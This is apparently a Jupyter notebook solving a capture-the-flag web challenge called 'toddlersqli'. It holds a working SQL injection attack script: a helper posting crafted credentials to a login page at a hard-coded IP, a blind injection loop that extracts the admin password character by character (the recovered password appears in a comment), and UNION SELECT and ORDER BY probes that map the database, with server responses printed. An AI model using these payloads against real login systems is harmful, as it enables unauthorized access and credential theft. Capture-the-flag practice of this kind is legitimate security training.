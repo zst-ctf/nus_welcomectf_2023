{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### toddlersqli"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create function to access the page easily"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import string\n",
    "import requests\n",
    "\n",
    "def attempt(username='admin', password=\"' OR '1\", debug=False):\n",
    "    data = {'username': username, 'password': password}\n",
    "    res = requests.post('http://34.87.186.254:29001/login', data=data)\n",
    "    if (debug):\n",
    "        print(res.text)\n",
    "    if 'Login failed' in res.text:\n",
    "        return False\n",
    "    elif 'Welcome admin' in res.text:\n",
    "        return True\n",
    "    return res.text\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From here, bruteforce for each character of the password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "charset = (string.printable\n",
    "                .replace(' ', '')\n",
    "                .replace('\\'', '')\n",
    "                .replace('%', '')\n",
    "                .replace('^', '')\n",
    "                .replace('+', '')\n",
    "                .replace('\\t\\n\\r\\x0b\\x0c', '')\n",
    "                .replace('\"', ''))\n",
    "\n",
    "flag = \"\"\n",
    "while True:\n",
    "    for ch in charset:\n",
    "        ch = ch.replace('_', '^_')\n",
    "        payload = f\"' or password LIKE '{flag+ch}%' ESCAPE '^' --\" # case-insensitive\n",
    "        payload = f\"' or SUBSTR(password, 1, {len(flag+ch)}) = '{flag+ch}\" # case-sensitive\n",
    "        success = attempt(password=payload)\n",
    "\n",
    "        if success:\n",
    "            flag += ch\n",
    "            print(\"Success\", flag)\n",
    "            break\n",
    "        else:\n",
    "            print(\"\\rFailed\", ch, end='')\n",
    "\n",
    "# admin:ASDFJASDJFHUIOSDHFIOQWHEOIF324231RKJ23H"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Password does not contain the flag. Attempts to look around the database."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False\n",
      "<!DOCTYPE html>\n",
      "<html>\n",
      "<head>\n",
      "    <title>toddler sqli</title>\n",
      "    <link rel=\"stylesheet\" href=\"/static/styles.css\">\n",
      "</head>\n",
      "<body>\n",
      "    <div class=\"container\">\n",
      "        \n",
      "<h1>Dashboard</h1>\n",
      "<p> Welcome helloworld</p>\n",
      "\n",
      "    </div>\n",
      "</body>\n",
      "</html>\n",
      "False\n",
      "<!doctype html>\n",
      "<html lang=en>\n",
      "<title>500 Internal Server Error</title>\n",
      "<h1>Internal Server Error</h1>\n",
      "<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n",
      "\n",
      "<!DOCTYPE html>\n",
      "<html>\n",
      "<head>\n",
      "    <title>toddler sqli</title>\n",
      "    <link rel=\"stylesheet\" href=\"/static/styles.css\">\n",
      "</head>\n",
      "<body>\n",
      "    <div class=\"container\">\n",
      "        \n",
      "<h1>Dashboard</h1>\n",
      "<p> Welcome 1</p>\n",
      "\n",
      "    </div>\n",
      "</body>\n",
      "</html>\n"
     ]
    }
   ],
   "source": [
    "# False: no username that is not admin\n",
    "print(attempt(username=\"' or (username != 'admin' );--\", password=\"\"))\n",
    "\n",
    "# Welcome helloworld: we can inject some strings\n",
    "print(attempt(username=\"' UNION ALL SELECT 'dummy', 'helloworld' ;--\", password=\"\"))\n",
    "\n",
    "# There are only 2 columns\n",
    "print(attempt(username=\"' ORDER BY 2 ;--\", password=\"\"))\n",
    "print(attempt(username=\"' ORDER BY 3 ;--\", password=\"\"))\n",
    "\n",
    "# Only 1 user\n",
    "print(attempt(username=\"' UNION SELECT 'dummy', (SELECT COUNT(*) from USERS); --\", password=\"\"))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
